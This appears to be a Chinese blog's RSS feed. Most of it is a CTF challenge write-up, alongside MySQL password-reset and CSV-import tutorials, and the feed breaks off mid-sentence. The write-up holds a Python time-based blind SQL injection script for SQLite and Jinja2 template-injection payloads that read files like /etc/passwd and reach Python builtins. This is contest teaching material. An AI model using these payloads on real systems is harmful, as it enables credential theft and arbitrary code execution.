<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>零碎记忆</title><link>https://blog.yuukisama.cc/</link><description>Recent content on 零碎记忆</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 04 Jul 2019 23:07:04 +0000</lastBuildDate><atom:link href="https://blog.yuukisama.cc/index.xml" rel="self" type="application/rss+xml"/><item><title>YuukiSama的求生之路私服</title><link>https://blog.yuukisama.cc/p/yuukisama%E7%9A%84%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF%E7%A7%81%E6%9C%8D/</link><pubDate>Thu, 04 Jul 2019 23:07:04 +0000</pubDate><guid>https://blog.yuukisama.cc/p/yuukisama%E7%9A%84%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF%E7%A7%81%E6%9C%8D/</guid><description>&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/1.jpg" >
&lt;img src="https://blog.yuukisama.cc/1.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>
&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/2.jpg" >
&lt;img src="https://blog.yuukisama.cc/2.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p></description></item><item><title>2019信安国赛出题经历</title><link>https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/</link><pubDate>Wed, 05 Jun 2019 15:22:45 +0000</pubDate><guid>https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;ul>
&lt;li>无力吐槽的信安国赛，段子乎喷了上届比赛有多坑，感觉这届也不差啊？&lt;/li>
&lt;li>算了，我知道是我太菜。&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ul>
&lt;li>本博客记录了一篇2019信安国赛复赛本队出题的一些经历。包括题目思路，搭建方法，以及writeup。&lt;/li>
&lt;li>尽管我们没有最后参加复赛，但是也发现出题是一个很好的锻炼方式。&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 166;
flex-basis: 400px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1.jpeg" data-size="1280x768">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1.jpeg"
width="1280"
height="768"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1_hua3dd05f974f1a431fbeb9c680d95411e_112468_480x0_resize_q75_box.jpeg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1_hua3dd05f974f1a431fbeb9c680d95411e_112468_1024x0_resize_q75_box.jpeg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="more">MORE&lt;/h2>
&lt;ul>
&lt;li>题目名称：不仅仅是个SQL&lt;/li>
&lt;li>出题人：CC from nothing&lt;/li>
&lt;/ul>
&lt;h3 id="points">POINTS&lt;/h3>
&lt;ol>
&lt;li>基于SQLITE数据库的盲注&lt;/li>
&lt;li>基于jinja2模板注入漏洞的任意代码执行漏洞&lt;/li>
&lt;/ol>
&lt;h3 id="writeup">WRITEUP&lt;/h3>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 199;
flex-basis: 479px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2.jpg" data-size="957x479">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2.jpg"
width="957"
height="479"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2_hu0efecf5b9057868741183010db0eb89b_25995_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2_hu0efecf5b9057868741183010db0eb89b_25995_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>打开网站首先看到的是一个登陆界面&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 599;
flex-basis: 1438px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1.jpg" data-size="959x160">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1.jpg"
width="959"
height="160"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1_hu0213be6c9b6faaa6074505904a6a7b8c_31796_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/1_hu0213be6c9b6faaa6074505904a6a7b8c_31796_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>照例查看一下网站的robots.txt看一下有没有什么可以发现的。&lt;/li>
&lt;li>robots.txt中是网站登陆认证逻辑的源码，可以看出后算是使用python编写，数据库为sqlite。并对用户输入进行了过滤。&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 199;
flex-basis: 479px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2.jpg" data-size="957x479">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2.jpg"
width="957"
height="479"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2_hu0efecf5b9057868741183010db0eb89b_25995_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/2_hu0efecf5b9057868741183010db0eb89b_25995_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>输入常用payload发现没有任何回显，所以这里需要盲注&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sqlite3数据库的盲注是采用randomblob()函数
randomblob()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>经过多次尝试发现后端过滤了小写的select，from等关键词。于是采用如图所示的方式注入&lt;/p>
&lt;/li>
&lt;li>
&lt;p>我们编写了如下脚本来注入获取密码&lt;/p>
&lt;pre tabindex="0">&lt;code>def sqlpw(url):
session=requests.Session()
params={&amp;quot;password&amp;quot;:&amp;quot;0&amp;quot;}
password=&amp;quot;&amp;quot;
for i in range(32):
for x in &amp;quot;0123456789abcdefghijklmnopqrstuvwsyz&amp;quot;:
try:
username=&amp;quot;admin'AND(SELECT(hex(substr(password,{},1)))FROM(users))=hex('{}')AND(randomblob(1000000000))--&amp;quot;.format(i+1,x)
params['username']=username
# print(params)
r=session.post(url,data=params,timeout=1)
# print(r.status_code)
except exceptions.Timeout:
password=password+x
logging.info(password)
sleep(3)
break
return password
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>运行脚本之后我们就获取到了密码的md5值，利用网上很多的md5查询库便可以得到密码原文&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 92;
flex-basis: 222px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/3.jpg" data-size="737x795">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/3.jpg"
width="737"
height="795"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/3_hu9086a54fd7f46be09acc8afa6004af03_119587_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/3_hu9086a54fd7f46be09acc8afa6004af03_119587_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>使用用户名密码登陆成功之后出现如上的欢迎界面。检查网页源码发现flag位于根目录下&lt;/li>
&lt;li>这里的鸟居图片既是另一个提示。jinja2项目的LOGO
&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/4.png" >
&lt;img src="https://blog.yuukisama.cc/4.png"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 116;
flex-basis: 280px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/4.jpg" data-size="755x647">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/4.jpg"
width="755"
height="647"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/4_hucf704ee0970ac6792276470fd3ac2273_50205_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/4_hucf704ee0970ac6792276470fd3ac2273_50205_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>从URL传入参数username入手写入测试payload验证漏洞存在&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 201;
flex-basis: 483px"
>
&lt;a href="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/5.jpg" data-size="1309x650">
&lt;img src="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/5.jpg"
width="1309"
height="650"
srcset="https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/5_hufb40f98a8aba53f602b04210ac231c95_63494_480x0_resize_q75_box.jpg 480w, https://blog.yuukisama.cc/p/2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E5%87%BA%E9%A2%98%E7%BB%8F%E5%8E%86/5_hufb40f98a8aba53f602b04210ac231c95_63494_1024x0_resize_q75_box.jpg 1024w"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ul>
&lt;li>经过测试发现注入点过滤方括号，于是构成如图所示payload完成注入获得flag&lt;/li>
&lt;/ul>
&lt;h2 id="jinja2模板注入漏洞">Jinja2模板注入漏洞&lt;/h2>
&lt;ul>
&lt;li>Jinja2漏洞最早出现在py2的版本上。&lt;/li>
&lt;li>漏洞原理基本就是传入的url中如果包含python脚本也是会被模板解析的。因为模板能够访问python内置变量以及变量方法。&lt;/li>
&lt;li>注意python2和python3存在差别在类层结构上存在差别&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>__class__ 返回调用参数类型
__base__ 返回基类
__mro__ 允许我们在当前Python环境下追溯继承树
__subclasses__() 返回子类
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>获取基类&lt;/p>
&lt;p>首先通过str，dict，tuple，list等类型来获取python的基本类（因为python万物皆对象）你也可以通过一些其它jinja2已经导入的包来获取基类&lt;/p>
&lt;pre tabindex="0">&lt;code>python3:
''.__class__.__base__
[].__class__.__base__
requests.__class__.__base__
python2:
''.__class__.__mro__[2]
[].__class__.__base__
requets.__class__.__mro__[8]
&lt;/code>&lt;/pre>&lt;p>获取基类的方法可以在python命令行中输入尝试&lt;/p>
&lt;p>&lt;strong>如果题目对中括号做了限制，也可以通过__getitem__(2)函数绕过限制&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>读取文件&lt;/p>
&lt;p>&lt;strong>以下基类通过object代替&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>python2：
object.__subclasses__()[40]('/etc/password
').read()
//获取file类读文件
&lt;/code>&lt;/pre>&lt;p>python3中要复杂的多，首先是python3的类层结构和python2下相比会复杂的多。其次python3的类必须经过初始化等等操作才可以使用其内建函数&lt;/p>
&lt;pre tabindex="0">&lt;code>python3:
object.__subclasses__()[78].__init__.__globals__.__builtins__.open(&amp;quot;./flag.txt&amp;quot;,encoding=&amp;quot;utf-8&amp;quot;).read()
&lt;/code>&lt;/pre>&lt;p>python3中我们获取子类列表之后随便选择一个类，查看其__init__&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;slot wrapper '__init__' of 'object' objects&amp;gt;
&lt;/code>&lt;/pre>&lt;p>wrapper是指这些函数没有被重载。这是他们并不是function，并不具有___globals__属性。我们在多尝试几个子类就可以找到一个被__init__的类，比如。接下来就可以使用内置函数执行命令。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>以上都只是最基础的操作，jinja2模板注入还有很多其他操作需要更多的尝试理解才可以完成。&lt;/p>
&lt;h2 id="后记">后记&lt;/h2>
&lt;ul>
&lt;li>这次比赛真是一个很不愉快的体验。这个题目出题到写博客也隔了很久。所以有些细节在本博客中可能描述的很不清楚。（总之这篇博客很垃圾就是了）在图书馆办公室一边修理爬虫一边跑着爬虫利用闲暇之余写出来的博客真的质量不高令人堪忧。总之就这样吧，感谢阅读。&lt;/li>
&lt;/ul></description></item><item><title>MYSQL密码重置详解</title><link>https://blog.yuukisama.cc/p/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</link><pubDate>Wed, 29 May 2019 11:04:15 +0000</pubDate><guid>https://blog.yuukisama.cc/p/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>很多同学在学习数据库操作的过程中，总会因为某些莫名奇妙的原因导致数据库密码变动，而到了不得不重置数据库密码的情况。本文主要讲解一下各个版本的MYSQL数据库重置密码的方法。&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/1.jpg" >
&lt;img src="https://blog.yuukisama.cc/1.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="如何查看mysql版本">如何查看MYSQL版本&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>打开一个命令行，在命令行里输入如下指令（如果你的MYSQL配置了环境变量的话）&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql --version
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>如果你的MYSQL没有配置环境变量，你可以去到mysql的安装目录下的bin文件夹里，运行上述命令。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你不知道如何改变命令行目录，可以用打开文件管理器，进入到mysql的安装目录下的bin文件夹内然后按住shift再点击鼠标右键。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>这时你可以看到右键菜单里有个“在此处打开powershell窗口”（或者也可能时在此处打开cmd窗口一类的）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你连这些都不会，如果你不知道什么是环境变量。emmmmmm这个教程大概不适合你.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>以上均基于Microsoft Windows 10系统&lt;/strong>&lt;/p>
&lt;h2 id="mysql-55">MYSQL 5.5+&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先开启一个具有管理员权限的命令行，在其中输入如下指令关闭mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来进入到mysql的安装文件夹下的bin目录内（如果你配置了环境变量也可以直接在命令行里运行）&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld -nt --skip-grant-tables
&lt;/code>&lt;/pre>&lt;p>如果你发现命令行运行的“卡住了”，那么恭喜你可以成功进入下一步&lt;/p>
&lt;p>&amp;ndash;skip-grant-tables
你可以简单的理解为跳过密码认证&lt;/p>
&lt;/li>
&lt;li>
&lt;p>接下来保证这个命令行界面开启状态，重新打开一个新的命令行窗口。运行如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;p>出现提示输入密码直接按回车即可，你会发现你已经成功给进入到了数据库内部&lt;/p>
&lt;/li>
&lt;li>
&lt;p>然后使用数据库命令重置密码即可&lt;/p>
&lt;pre tabindex="0">&lt;code>use mysql; -- 切换到mysql数据库
update user set password=password(&amp;quot;123456&amp;quot;) where user=&amp;quot;root&amp;quot;; --修改密码为123456
&lt;/code>&lt;/pre>&lt;p>以上命令也可以用于你知道密码的情况下想要修改密码。
不过在正常情况下执行完上述命令之后需要再增加如下命令刷新权限才可以让数据库密码更新成功（当然这里不需要）&lt;/p>
&lt;pre tabindex="0">&lt;code>flush privileges;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>当修改命令执行成功后。输入exit退出数据库。关闭这个新的命令行，回到我们一开始启动的命令行。使用ctrl+c中止命令。然后使用如下命令重启mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>如果不出意外，服务启动成功，那么你的密码重置就完成了。&lt;/p>
&lt;hr>
&lt;h2 id="mysql-80">MYSQL 8.0+&lt;/h2>
&lt;ul>
&lt;li>MYSQL 8下有两种方法可以重置密码&lt;/li>
&lt;/ul>
&lt;h3 id="使用--init-file">使用&amp;ndash;init-file&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>首先依旧是打开一个具有管理员权限的命令行，使用命令停止mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来创建一个文本文件（sql.txt），指定在启动时需要执行的修改密码的命令。&lt;/p>
&lt;pre tabindex="0">&lt;code>ALTER USER &amp;quot;root&amp;quot;@&amp;quot;localhost&amp;quot; IDENTIFIED BY &amp;quot;123456&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>将密码重置为123456&lt;/p>
&lt;/li>
&lt;li>
&lt;p>最后使用如下命令启动&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --init-file=E:/sql.txt --console
&lt;/code>&lt;/pre>&lt;p>启动成功之后重新开启一个新的命令行，尝试使用重置的密码（123456）登陆数据库吧。如果没有重置成功，请检查sql.txt中的sql语句语法是否出现问题。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当你使用重置的密码登陆成功之后，关闭掉新的命令行界面，回到旧的命令行界面使用ctrl+c中止命令。最后再重新启动mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="使用--skip-grant-tables">使用&amp;ndash;skip-grant-tables&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>开启一个具有管理员权限的命令行，先关闭mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>使用如下命令无密码启动服务&lt;/p>
&lt;pre tabindex="0">&lt;code>mysqld --console --skip-grant-tables --shared-memory
&lt;/code>&lt;/pre>&lt;p>这就是mysql5与mysql8的差别，mysql8想要使用skip-grant启动必须加入额外参数，否则服务无法启动&lt;/p>
&lt;/li>
&lt;li>
&lt;p>接下来重新开启一个命令行以空密码登陆数据库&lt;/p>
&lt;pre tabindex="0">&lt;code>mysql -u root -p
&lt;/code>&lt;/pre>&lt;p>提示输入密码直接按下回车即可。接下来重置密码&lt;/p>
&lt;pre tabindex="0">&lt;code>update mysql.user set authenication_string=&amp;quot;123456&amp;quot; where user=&amp;quot;root&amp;quot; and host=&amp;quot;localhost&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>执行成功无错误之后即表示密码重置成功&lt;/p>
&lt;/li>
&lt;li>
&lt;p>接下来退出数据库，关闭新的命令行，回到之前的命令行使用ctrl+c中止命令，然后重新启动mysql服务&lt;/p>
&lt;pre tabindex="0">&lt;code>net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol></description></item><item><title>MySQL导入csv文件数据</title><link>https://blog.yuukisama.cc/p/mysql%E5%AF%BC%E5%85%A5csv%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE/</link><pubDate>Wed, 15 May 2019 15:33:28 +0000</pubDate><guid>https://blog.yuukisama.cc/p/mysql%E5%AF%BC%E5%85%A5csv%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE/</guid><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>记录关于MySQL从csv文件导入数据的一些采坑记录&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/star.jpg" >
&lt;img src="https://blog.yuukisama.cc/star.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;h2 id="什么是csv文件">什么是csv文件&lt;/h2>
&lt;ul>
&lt;li>csv文件本质只是一个文本文件，它与你所见过的txt文件别无差异。（对，除了excel，你还可以用txt打开这类文件）&lt;/li>
&lt;li>csv文件（Comma-Separated Values）逗号分隔值文件格式，其文件以&lt;strong>纯文本&lt;/strong>形式存储表格数据，并且以逗号分隔。&lt;/li>
&lt;/ul>
&lt;h2 id="怎样将数据从csv导入到mysql">怎样将数据从csv导入到mysql&lt;/h2>
&lt;ul>
&lt;li>
&lt;h3 id="如果你看到如下报错">如果你看到如下报错&lt;/h3>
&lt;pre tabindex="0">&lt;code>The MySQL server is running with the --secure-file-priv option so it cannot execute...
&lt;/code>&lt;/pre>&lt;p>首先部分Mysql server设置中不允许你从任意路径导入数据&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>解决这点，你只需要在mysql server的&lt;strong>安装路径&lt;/strong>下修改my.ini文件，并在其中修改如下内容（划重点，安装路径！！！安装路径里必定存在bin这类似文件夹）如果你有这个文件就找到对应的地方修改，如果没有就添加（注意开头不要有井号）&lt;/p>
&lt;p>&lt;strong>修改文件最好备份my.ini因为如果这个文件内容错误mysql将无法启动&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>[mysqld]
secure-file-priv=&amp;quot;D:/CoderLife/testMySQL&amp;quot;
# 这个路径你自己可以自定义
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>如果你的mysql安装目录下不存在这个文件，你可以尝试去C:/Program Data/MySQL/MySQL Server类似路径下寻找（Program Data文件夹是一个隐藏文件夹，请勾选显示隐藏文件以及文件夹）&lt;/li>
&lt;li>如果还是无法找到可以使用搜索文件功能&lt;/li>
&lt;li>如果完全没有这个文件(&lt;del>作者我帮忙配置mysql的那一部分人应该是完全没有这个文件的&lt;/del>)，则在mysql server的安装路径下新建my.ini,内部基础内容如下&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>[mysqld]
# 这里指定你想要设置的路径，必须保证这个路径存在
secure-file-priv=&amp;quot;E:/test&amp;quot;
[mysql]
default-character-set=utf8
[client]
default-character-set=utf8
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来重启mysql服务&lt;/p>
&lt;p>在具有&lt;strong>管理员权限&lt;/strong>的命令行下输入如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来进入数据库，输入如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>show variables like &amp;quot;%secure%&amp;quot;
&lt;/code>&lt;/pre>&lt;p>如果出现的回显中包含你之前设置的路径，则表示路径修改成功过&lt;/p>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/1.jpg" >
&lt;img src="https://blog.yuukisama.cc/1.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;h3 id="文件字符编码问题">文件字符编码问题&lt;/h3>
&lt;p>要想成功导入文件，必须保证csv文件编码格式与数据库的编码格式相同。&lt;/p>
&lt;p>mysql是一个复杂的数据库，这里我们从默认编码开始修改。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>修改默认字符编码&lt;/p>
&lt;p>依旧是打开my.ini文件，修改文件内容（添加或者查找修改，依据你是创建的文件还是原来就有my.ini文件自行把握）&lt;/p>
&lt;p>修改如下三处（如果某个[xxx]标签下没有则添加）&lt;/p>
&lt;pre tabindex="0">&lt;code>[client]
default-character-set=utf8
[mysql]
default-character-set=utf8
[mysqld]
character-set-server=utf8
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>重启mysql服务&lt;/p>
&lt;p>具有管理员权限的命令行！
具有管理员权限的命令行！
具有管理员权限的命令行！&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>进入数据库查看是否修改成功&lt;/p>
&lt;pre tabindex="0">&lt;code> mysql&amp;gt; SHOW VARIABLES LIKE 'character%';
+--------------------------+---------------------------------------------------------+
| Variable_name            | Value                                                   |
+--------------------------+---------------------------------------------------------+
| character_set_client     | utf8                                                    |
| character_set_connection | utf8                                                    |
| character_set_database   | utf8                                                    |
| character_set_filesystem | binary                                                  |
| character_set_results    | utf8                                                    |
| character_set_server     | utf8                                                    |
| character_set_system     | utf8                                                    |
| character_sets_dir       | C:\Program Files\MySQL\MySQL Server 5.0\share\charsets\ |
+--------------------------+---------------------------------------------------------+
8 rows in set
&lt;/code>&lt;/pre>&lt;p>出现类似如上字样表示修改成功&lt;/p>
&lt;/li>
&lt;li>
&lt;p>修改csv文件的编码为utf-8&lt;/p>
&lt;p>作者本人使用的是VScode转换的编码&lt;/p>
&lt;p>你也可以使用类似的其他编辑器修改(列如notepad++)&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;a class="link" href="https://notepad-plus-plus.org/download/" target="_blank" rel="noopener"
>从这里下载notepad++&lt;/a>(如果你打不开就百度瞎几把找一个吧)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用notepad++打开csv文件,右下角就会标注这个文件的编码&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/3.jpg" >
&lt;img src="https://blog.yuukisama.cc/3.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;ol>
&lt;li>选择编码-&amp;gt;选择转为UTF-8编码,最后保存退出即可&lt;/li>
&lt;/ol>
&lt;p>&lt;figure
>
&lt;a href="https://blog.yuukisama.cc/4.jpg" >
&lt;img src="https://blog.yuukisama.cc/4.jpg"
loading="lazy"
>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;strong>不建议使用txt修改，因为txt的UTF-8格式是带有BOM的，导入时依旧会报错&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;h3 id="导入命令问题">导入命令问题&lt;/h3>
&lt;p>仅仅使用&lt;/p>
